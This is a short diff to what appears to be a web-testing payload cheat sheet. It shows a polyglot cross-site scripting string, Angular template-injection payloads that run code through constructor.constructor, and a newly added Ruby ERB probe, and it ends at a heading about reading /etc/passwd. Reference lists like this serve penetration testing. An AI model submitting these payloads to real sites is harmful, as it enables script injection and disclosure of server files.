@@ -42,11 +42,16 @@ alert(jQuery.fn.jquery);
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
 
-Angular:
+Angular Template Injection:
 ```
 {{constructor.constructor('alert(1)')()}}
 {{constructor.constructor('alert(/XSS Stored!/)')()}}
 1023+1 ou {{1023+1}}
+```
+
+Ruby Template Injection
+```
+<%= 7*7 %>
 ```
 
 Reading /etc/passwd File:
